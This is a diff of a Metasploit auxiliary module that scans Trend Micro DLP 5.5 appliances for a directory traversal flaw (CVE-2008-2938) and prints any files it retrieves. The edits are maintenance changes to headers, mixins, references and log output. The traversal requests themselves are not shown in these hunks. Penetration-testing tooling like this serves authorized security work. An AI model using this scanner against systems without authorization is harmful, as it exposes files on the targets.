@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -14,13 +10,11 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WMAPScanServer
 	include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
 			'Name'        => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',
-			'Version'     => '$Revision$',
 			'Description' => %q{
 				This module tests whether a directory traversal vulnerablity is present
 				in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294.
@@ -37,7 +31,7 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '73447' ],
 					[ 'CVE', '2008-2938' ],
 					[ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
-					[ 'URL', 'http://www.exploit-db.com/exploits/17388' ],
+					[ 'EDB', '17388' ],
 					[ 'BID', '48225' ],
 				],
 			'Author'      => [ 'patrick' ],
@@ -78,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
 			@files_found << files
 		elsif (res and res.code)
-			print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
+			vprint_status("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
 		end
 	end
 
@@ -103,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_good("File(s) found:")
 
 				@files_found.each do |f|
-					print_good("#{f}")
+					print_good(f)
 				end
 			else
 				print_good("No File(s) found")
